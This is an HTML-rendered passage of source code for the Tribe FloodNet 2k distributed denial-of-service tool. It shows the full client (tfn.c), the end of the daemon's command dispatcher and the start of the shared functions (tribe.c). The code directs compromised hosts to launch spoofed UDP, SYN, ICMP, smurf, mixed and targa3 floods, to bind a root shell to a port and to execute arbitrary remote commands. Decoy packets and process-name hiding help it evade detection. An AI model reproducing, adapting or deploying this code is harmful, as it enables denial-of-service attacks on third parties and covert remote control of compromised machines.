<br><font color="#3333FF">&nbsp;&nbsp; nospoof = 3;&nbsp; /* spoof mask:
real.real.real.* */</font>
<br><font color="#3333FF">&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;default:</font>
<br><font color="#3333FF">&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_SHELL:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shellsex (atoi
(target)); /* shell bound to target port */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_TARGA:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (fw00ding)&nbsp;
/* already in progress, ignored */</font>
<br><font color="#3333FF">&nbsp;break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 4;&nbsp;
/* commencing targa3 attack */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEKIDS);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commence_targa3
(target);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEME);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_MIX:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (fw00ding)&nbsp;
/* already in progress, ignored */</font>
<br><font color="#3333FF">&nbsp;break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 5;&nbsp;
/* commencing interval flood */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEKIDS);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commence_mix (target);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEME);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_REXEC:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; system (target);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>tfn.c</font></font></center>

<p><font color="#FF0000">/*</font>
<br><font color="#FF0000">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#FF0000">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* tfn.c - tribe floodnet client</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#FF0000">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#FF0000">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#FF0000">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;*/</font>
<p><font color="#FF0000">#include "tribe.h"</font>
<p><font color="#FF0000">#define RETRY 20&nbsp; /* send datagrams x times,
20 is fine */</font>
<p><font color="#FF0000">void usage (char *);</font>
<br><font color="#FF0000">void tfn_sendto (unsigned long dst);</font>
<br><font color="#FF0000">extern void security_through_obscurity (int);</font>
<p><font color="#FF0000">#ifdef REQUIRE_PASS</font>
<br><font color="#FF0000">void passchk (void);</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">#ifdef WINDOZE</font>
<br><font color="#FF0000">extern char *optarg;</font>
<br><font color="#FF0000">int getopt (int, char *const *, const char *);</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">char *target = NULL, *port = NULL, RID = '0';</font>
<br><font color="#FF0000">int nospoof = 0, cid = 0, decoy = 0, proto =
-1;</font>
<br><font color="#FF0000">unsigned long myip = 0;</font>
<p><font color="#FF0000">int</font>
<br><font color="#FF0000">main (int argc, char **argv)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; FILE *tfnlist = NULL;</font>
<br><font color="#FF0000">&nbsp; char nexthost[BS];</font>
<br><font color="#FF0000">&nbsp; unsigned long tfnhost = 0;</font>
<br><font color="#FF0000">&nbsp; int opt;</font>
<p><font color="#FF0000">&nbsp; if (argc &lt; 2)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; usage (argv[0]);</font>
<p><font color="#FF0000">&nbsp; while ((opt = getopt (argc, argv, "P:D:S:f:h:i:p:c:"))
!= EOF)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; switch (opt)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'P':</font>
<br><font color="#FF0000">&nbsp;if (strcasecmp (optarg, "icmp") == 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp; proto = 0;</font>
<br><font color="#FF0000">&nbsp;if (strcasecmp (optarg, "udp") == 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp; proto = 1;</font>
<br><font color="#FF0000">&nbsp;if (strcasecmp (optarg, "tcp") == 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp; proto = 2;</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'D':</font>
<br><font color="#FF0000">&nbsp;decoy = atoi (optarg);</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'S':</font>
<br><font color="#FF0000">&nbsp;myip = resolve (optarg);</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'f':</font>
<br><font color="#FF0000">&nbsp;if ((tfnlist = fopen (optarg, "r")) ==
NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; printf ("Unable to open
file: %s\n", optarg);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; usage (argv[0]);</font>
<br><font color="#FF0000">&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'h':</font>
<br><font color="#FF0000">&nbsp;tfnhost = resolve (optarg);</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'i':</font>
<br><font color="#FF0000">&nbsp;target = malloc (BS);</font>
<br><font color="#FF0000">&nbsp;strncpy (target, optarg, BS);</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'p':</font>
<br><font color="#FF0000">&nbsp;port = malloc (BS);</font>
<br><font color="#FF0000">&nbsp;strncpy (port, optarg, BS);</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'c':</font>
<br><font color="#FF0000">&nbsp;cid = atoi (optarg);</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#FF0000">&nbsp;usage (argv[0]);</font>
<br><font color="#FF0000">&nbsp;break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">&nbsp; printf ("[0;35m\n");</font>
<p><font color="#FF0000">&nbsp; printf ("\tProtocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
: ");</font>
<br><font color="#FF0000">&nbsp; switch (proto)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 0:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("icmp\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 1:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("udp\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 2:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("tcp\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("random\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">&nbsp; if (decoy)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf ("\tDecoy hosts&nbsp;&nbsp;
: %d\n", decoy);</font>
<p><font color="#FF0000">&nbsp; if (myip)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf ("\tSource IP&nbsp;&nbsp;&nbsp;&nbsp;
: %s\n", ntoa (myip));</font>
<br><font color="#FF0000">&nbsp; else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf ("\tSource IP&nbsp;&nbsp;&nbsp;&nbsp;
: random\n");</font>
<p><font color="#FF0000">&nbsp; if (tfnlist != NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf ("\tClient input&nbsp;
: list\n");</font>
<br><font color="#FF0000">&nbsp; else if (tfnhost != 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf ("\tClient input&nbsp;
: single host\n");</font>
<br><font color="#FF0000">&nbsp; else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; usage (argv[0]);</font>
<p><font color="#FF0000">&nbsp; if (port != NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf ("\tTCP port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
: %d\n", atoi (port));</font>
<br><font color="#FF0000">&nbsp; else if (cid == 5)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; port = malloc
(BS);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (port,
"0");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">&nbsp; if (target != NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ((cid > 4)
&amp;&amp; (cid != 10))</font>
<br><font color="#FF0000">&nbsp;printf ("\tTarget(s)&nbsp;&nbsp;&nbsp;&nbsp;
: %s\n", target);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; else if (cid)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; usage (argv[0]);</font>
<p><font color="#FF0000">&nbsp; printf ("\tCommand&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
: ");</font>
<br><font color="#FF0000">&nbsp; switch (cid)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 0:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_STOPIT;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("stop
flooding\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (target ==
NULL)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; target = malloc (BS);</font>
<br><font color="#FF0000">&nbsp;&nbsp; strcpy (target, "0");</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 1:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_SWITCH;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("change
spoof level to %d\n", atoi (target));</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 2:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_PSIZE;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("change
packet size to %d bytes\n", atoi (target));</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 3:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_SHELL;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("bind
shell(s) to port %d\n", atoi (target));</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 4:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_SENDUDP;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("commence
udp flood\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 5:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_SENDSYN;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("commence
syn flood, port: %s\n",</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; atoi (port)
? port : "random");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 6:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_ICMP;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("commence
icmp echo flood\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 7:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_SMURF;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("commence
icmp broadcast (smurf) flood\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 8:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_MIX;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("commence
mix flood\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 9:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_TARGA;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("commence
targa3 attack\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; case 10:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RID = ID_REXEC;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("execute
remote command\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("error\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usage (argv[0]);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">#ifdef REQUIRE_PASS</font>
<br><font color="#FF0000">&nbsp; passchk ();</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">&nbsp; printf ("[0;31m\nSending out packets:
[0;0m");</font>
<br><font color="#FF0000">&nbsp; fflush (stdout);</font>
<p><font color="#FF0000">&nbsp; security_through_obscurity (1);</font>
<p><font color="#FF0000">&nbsp; if (tfnlist == NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; tfn_sendto (tfnhost);</font>
<br><font color="#FF0000">&nbsp; else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; while (fgets (nexthost, 512,
tfnlist) != NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;switch (nexthost[0])</font>
<br><font color="#FF0000">&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp; case '\n':</font>
<br><font color="#FF0000">&nbsp;&nbsp; case '\r':</font>
<br><font color="#FF0000">&nbsp;&nbsp; case ' ':</font>
<br><font color="#FF0000">&nbsp;&nbsp; case '#':</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; continue;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#FF0000">&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp;trimbuf (nexthost);</font>
<br><font color="#FF0000">&nbsp;tfnhost = resolve (nexthost);</font>
<br><font color="#FF0000">&nbsp;if (tfnhost)</font>
<br><font color="#FF0000">&nbsp;&nbsp; tfn_sendto (tfnhost);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">&nbsp; printf ("\n");</font>
<br><font color="#FF0000">&nbsp; return 0;</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">#ifdef REQUIRE_PASS</font>
<br><font color="#FF0000">void</font>
<br><font color="#FF0000">passchk (void)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; char test1[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
test2[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; enc1[100], enc2[100], *p =
getpass ("\n[0;0mPassword verification:");</font>
<p><font color="#FF0000">&nbsp; memset (enc1, 0, 100);</font>
<br><font color="#FF0000">&nbsp; memset (enc2, 0, 100);</font>
<p><font color="#FF0000">&nbsp; security_through_obscurity (1);</font>
<br><font color="#FF0000">&nbsp; encode64 (test1, enc1, strlen (test1));</font>
<br><font color="#FF0000">&nbsp; security_through_obscurity (0);</font>
<br><font color="#FF0000">&nbsp; aes_setkey (p);</font>
<br><font color="#FF0000">&nbsp; encode64 (test2, enc2, strlen (test2));</font>
<p><font color="#FF0000">&nbsp; if (strcmp (enc1, enc2))</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf (stderr,
"Sorry, passwords do not match.\n");</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf (stderr,
"1 %s\n2 %s\n", enc1, enc2);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">tfn_sendto (unsigned long dst)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i, j;</font>
<br><font color="#FF0000">&nbsp; char ltarget[BS], lport[BS];</font>
<br><font color="#FF0000">&nbsp; unsigned long src = myip ? myip : k00lip
();</font>
<p><font color="#FF0000">&nbsp; for (i = 0; i &lt; RETRY; i++)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (cid == 5)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; strcpy (lport, port);</font>
<br><font color="#FF0000">&nbsp;&nbsp; tfntransmit (src, dst, proto, ID_SYNPORT,
lport);</font>
<br><font color="#FF0000">&nbsp;&nbsp; usleep (666);</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (ltarget,
target);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tfntransmit (src,
dst, proto, RID, ltarget);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (decoy)</font>
<br><font color="#FF0000">&nbsp;for (j = 0; j &lt; decoy; j++)</font>
<br><font color="#FF0000">&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; usleep (10);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; strcpy (ltarget, target);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; tfntransmit (src, k00lip
(), proto, RID, ltarget);</font>
<br><font color="#FF0000">&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usleep (100);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">&nbsp; for (j = 0; j &lt; decoy; j++)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; printf ("d");</font>
<p><font color="#FF0000">&nbsp; printf (".");</font>
<br><font color="#FF0000">&nbsp; fflush (stdout);</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">usage (char *arg)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; printf ("[1;34musage: %s &lt;options>\n",
arg);</font>
<br><font color="#FF0000">&nbsp; printf ("[-P protocol]\tProtocol for server
communication. Can be ICMP, UDP or TCP.\n\t\tUses a random protocol as
default\n");</font>
<br><font color="#FF0000">&nbsp; printf ("[-D n]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\tSend out n bogus requests for each real one to decoy targets\n");</font>
<br><font color="#FF0000">&nbsp; printf ("[-S host/ip]\tSpecify your source
IP. Randomly spoofed by default, you need\n\t\tto use your real IP if you
are behind spoof-filtering routers\n");</font>
<br><font color="#FF0000">&nbsp; printf ("[-f hostlist]\tFilename containing
a list of hosts with TFN servers to contact\n");</font>
<br><font color="#FF0000">&nbsp; printf ("[-h hostname]\tTo contact only
a single host running a TFN server\n");</font>
<br><font color="#FF0000">&nbsp; printf ("[-i target string]\tContains
options/targets separated by '%s', see below\n", DELIMITER);</font>
<br><font color="#FF0000">&nbsp; printf ("[-p port]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\tA TCP destination port can be specified for SYN floods\n");</font>
<br><font color="#FF0000">&nbsp; printf ("&lt;-c command ID>\t0 - Halt
all current floods on server(s) immediately\n");</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t1 - Change IP antispoof-level
(evade rfc2267 filtering)\n\t\t&nbsp;&nbsp;&nbsp; usage: -i 0 (fully spoofed)
to -i 3 (/24 host bytes spoofed)\n");</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t2 - Change Packet size, usage:
-i &lt;packet size in bytes>\n");</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t3 - Bind root shell to a
port, usage: -i &lt;remote port>\n");</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t4 - UDP flood, usage: -i
victim%svictim2%svictim3%s...\n", DELIMITER, DELIMITER, DELIMITER);</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t5 - TCP/SYN flood, usage:
-i victim%s... [-p destination port]\n", DELIMITER);</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t6 - ICMP/PING flood, usage:
-i victim%s...\n", DELIMITER);</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t7 - ICMP/SMURF flood, usage:
-i victim%sbroadcast%sbroadcast2%s...\n", DELIMITER, DELIMITER, DELIMITER);</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t8 - MIX flood (UDP/TCP/ICMP
interchanged), usage: -i victim%s...\n", DELIMITER);</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t9 - TARGA3 flood (IP stack
penetration), usage: -i victim%s...\n", DELIMITER);</font>
<br><font color="#FF0000">&nbsp; printf ("\t\t10 - Blindly execute remote
shell command, usage -i command\n");</font>
<br><font color="#FF0000">&nbsp; printf ("[0;0m");</font>
<br><font color="#FF0000">&nbsp; exit (0);</font>
<br><font color="#FF0000">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>tribe.c</font></font></center>

<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#3333FF">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* tribe.c - common functions</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#3333FF">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#3333FF">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#3333FF">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<p><font color="#3333FF">#include "tribe.h"</font>
<p><font color="#3333FF">int rcounter = 0;</font>
<br><font color="#3333FF">char rseed[65535];</font>
<br><font color="#3333FF">extern unsigned long myip;</font>
<br><font color="#3333FF">extern int nospoof;</font>
<p><font color="#3333FF">void</font>
<br><font color="#3333FF">random_init (void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; int rfd = open ("/dev/urandom", O_RDONLY);</font>
<br><font color="#3333FF">&nbsp; if (rfd &lt; 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; rfd = open ("/dev/random",
O_RDONLY);</font>
<br><font color="#3333FF">&nbsp; rcounter = read (rfd, rseed, 65535);</font>
<br><font color="#3333FF">&nbsp; close (rfd);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">inline</font>
<br><font color="#3333FF">long</font>
<br><font color="#3333FF">getrandom (int min, int max)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; if (rcounter &lt; 2)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; random_init ();</font>
<br><font color="#3333FF">&nbsp; srand (rseed[rcounter] + (rseed[rcounter
- 1] &lt;&lt; 8));</font>
<br><font color="#3333FF">&nbsp; rcounter -= 2;</font>
<br><font color="#3333FF">&nbsp; return ((random () % (int) (((max) + 1)
- (min))) + (min));</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void</font>
<br><font color="#3333FF">trimbuf (char *buf)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; int i = 0;</font>
<br><font color="#3333FF">&nbsp; for (i = 0; i &lt; strlen (buf); i++)</font>
